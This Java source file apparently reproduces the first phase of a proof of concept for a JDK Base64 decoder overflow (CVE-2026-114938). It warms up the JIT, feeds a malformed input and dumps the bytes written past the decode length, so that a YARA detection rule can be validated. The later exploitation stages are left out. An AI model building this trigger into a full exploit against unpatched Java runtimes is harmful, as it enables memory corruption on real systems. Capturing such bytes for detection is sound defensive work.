// OverflowProof — SAFE standalone Phase-1-only reproduction of CVE-2026-114938
// (calif.io crew's PoC, Phase 1 extracted; spray/feng-shui phases NOT included).
// Warms the AVX-512 VBMI Base64 intrinsic, decodes the malformed trigger into an
// oversized in-buffer dst, and dumps the 62 bytes written past decodedLen(50).
// Single process, own heap, oversized buffer catches the store in-bounds.
// Purpose: capture ground-truth overflow bytes to validate the house YARA.
import java.lang.management.ManagementFactory;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

public class OverflowProof {
    static volatile int sink;
    static final int JIT_WARMUP = 200_000;
    static final int DECODE_BUF_SIZE = 50;
    static final int OVERFLOW_LEN = 62;

    public static void main(String[] args) throws Exception {
        System.out.println("JDK:    " + System.getProperty("java.runtime.version"));
        System.out.println("VM:     " + System.getProperty("java.vm.name"));
        System.out.println("PID:    " + ManagementFactory.getRuntimeMXBean().getName().split("@")[0]);
        System.out.println("Cores:  " + Runtime.getRuntime().availableProcessors());
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        byte[] buf = new byte[4096];
        for (int i = 0; i < JIT_WARMUP; i++) sink += decoder.decode(valid, buf);

        Arrays.fill(buf, (byte) 0x5A);
        try { decoder.decode(malformed, buf); } catch (IllegalArgumentException e) { /* expected */ }

        int corrupt = 0;
        for (int i = DECODE_BUF_SIZE; i < DECODE_BUF_SIZE + OVERFLOW_LEN; i++)
            if (buf[i] != (byte) 0x5A) corrupt++;
        System.out.println("overflow bytes past decodedLen(" + DECODE_BUF_SIZE + "): " + corrupt);
        if (corrupt == 0) { System.out.println("NO OVERFLOW (patched JDK or no VBMI)"); return; }

        System.out.println("ground-truth pattern:");
        for (int row = 0; row < OVERFLOW_LEN; row += 16) {
            System.out.printf("  +%02d: ", row);
            for (int col = 0; col < 16 && row + col < OVERFLOW_LEN; col++)
                System.out.printf("%02x ", buf[DECODE_BUF_SIZE + row + col] & 0xFF);
            System.out.println();
        }
        // dump the corrupted buffer region to file for YARA validation
        try (java.io.FileOutputStream fos = new java.io.FileOutputStream("overflow_capture.bin")) {
            fos.write(buf, 0, 512);
        }
        System.out.println("capture written: overflow_capture.bin (first 512 bytes incl. overflow region)");
    }
}
